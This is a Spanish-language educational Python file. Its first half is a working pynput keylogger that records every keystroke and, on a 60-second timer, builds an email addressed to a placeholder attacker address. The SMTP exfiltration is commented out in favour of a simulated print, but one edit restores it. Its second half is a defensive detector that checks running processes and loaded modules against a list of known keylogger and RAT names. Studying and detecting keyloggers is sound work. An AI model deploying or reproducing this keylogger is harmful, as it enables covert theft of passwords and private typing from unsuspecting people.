# ── Keylogger básico en Python con pynput (SOLO EDUCATIVO) ──
# SOLO EDUCATIVO — Muestra el funcionamiento interno de un keylogger
# pynput es una librería LEGÍTIMA usada para automatización

from pynput import keyboard # type: ignore
from datetime import datetime
import threading, smtplib
from email.mime.text import MIMEText

log = []       # Buffer de pulsaciones
ventana = ''   # Título de la ventana activa (para dar contexto)

def on_press(key):
    """Callback ejecutado en cada pulsación"""
    try:
        # Teclas normales (letras, números)
        log.append(key.char)
    except AttributeError:
        # Teclas especiales (Enter, Backspace, Tab...)
        if key == keyboard.Key.enter:
            log.append('[ENTER]')
        elif key == keyboard.Key.backspace:
            log.append('[BACK]')
        elif key == keyboard.Key.space:
            log.append(' ')
        else:
            log.append(f'[{key.name.upper()}]')

def enviar_log():
    """Exfiltra el log cada 60 segundos por email"""
    if not log: return
    contenido = f'[{datetime.now()}]\n' + ''.join(log)
    log.clear()

    # Configuración SMTP del servidor del atacante
    msg = MIMEText(contenido)
    msg['Subject'] = 'Log de teclado'
    msg['From']    = 'keylogger@servidor-atacante.com'
    msg['To']      = 'atacante@ejemplo.com'

    # with smtplib.SMTP('smtp.servidor.com', 587) as s:
    #     s.starttls()
    #     s.login('user', 'pass')
    #     s.send_message(msg)
    print(f'[ENVÍO SIMULADO]\n{contenido}')  # ← en demo no se envía

    # Reprogramar la siguiente exfiltración
    threading.Timer(60, enviar_log).start()

# Iniciar escucha de teclado en hilo no bloqueante
listener = keyboard.Listener(on_press=on_press)
listener.start()
threading.Timer(60, enviar_log).start()
listener.join()

# ── Detección de keyloggers — análisis de procesos sospechosos (Python) ──

# Herramienta DEFENSIVA: detecta procesos con hooks de teclado activos
import psutil, ctypes, sys # type: ignore

# Lista de DLLs y nombres de proceso asociados a keyloggers conocidos
FIRMAS_SOSPECHOSAS = {
    'procesos': {'njrat', 'darkcomet', 'hawkeye', 'spyrix', 'agent_tesla'},
    'dlls':     {'pynput', 'keyhook', 'kbdhook'},
}

def detectar_hooks_teclado():
    alertas = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            nombre = proc.info['name'].lower()
            # Comprobar nombre del proceso
            if any(firma in nombre for firma in FIRMAS_SOSPECHOSAS['procesos']):
                alertas.append(f'Proceso sospechoso: {nombre} (PID {proc.info["pid"]})')

            # Comprobar DLLs cargadas en el proceso
            for dll in proc.memory_maps():
                ruta_dll = dll.path.lower()
                if any(firma in ruta_dll for firma in FIRMAS_SOSPECHOSAS['dlls']):
                    alertas.append(f'DLL sospechosa en {nombre}: {dll.path}')
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    if alertas:
        print('[ALERTA] Posible keylogger detectado:')
        for a in alertas: print(f'  → {a}')
    else:
        print('[OK] No se detectaron indicadores de keylogger')

detectar_hooks_teclado()
